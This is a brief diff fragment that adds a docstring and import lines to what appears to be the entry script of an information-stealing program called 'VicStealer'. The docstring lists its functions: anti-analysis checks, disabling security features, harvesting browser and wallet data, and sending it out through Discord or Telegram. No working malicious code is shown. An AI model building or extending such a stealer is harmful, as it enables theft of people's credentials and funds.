@@ -1,3 +1,6 @@
+"""This is the main entry point for the VicStealer malware. It orchestrates the execution of various modules based on the configuration settings defined in vic_config.py. The script performs anti-analysis checks, disables security features, extracts sensitive data from browsers, wallets, and other applications, and sends the collected data to specified endpoints such as Discord or Telegram."""
+
+
 import os
 import shutil
 import asyncio
